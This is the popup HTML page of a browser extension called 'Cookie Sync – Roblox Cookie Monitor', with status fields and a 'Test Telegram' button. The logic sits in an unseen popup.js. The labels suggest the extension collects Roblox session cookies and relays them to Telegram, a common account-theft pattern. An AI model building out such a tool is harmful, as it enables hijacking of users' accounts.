<!DOCTYPE html>
<html>
<head>
    <style>
        body { width: 300px; padding: 15px; font-family: Arial, sans-serif; }
        .header { text-align: center; margin-bottom: 15px; }
        .status { padding: 10px; border-radius: 5px; margin: 5px 0; }
        .active { background: #d4edda; color: #155724; }
        .inactive { background: #f8d7da; color: #721c24; }
        button { width: 100%; padding: 8px; margin: 5px 0; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <h3>🍪 Cookie Sync</h3>
        <p>Roblox Cookie Monitor</p>
    </div>
    
    <div id="status" class="status">
        🔍 Checking status...
    </div>
    
    <div id="cookieInfo">
        No cookies found
    </div>
    
    <button id="testBtn">📡 Test Telegram</button>
    <button id="refreshBtn">🔄 Refresh Status</button>
    
    <script src="popup.js"></script>
</body>
</html>
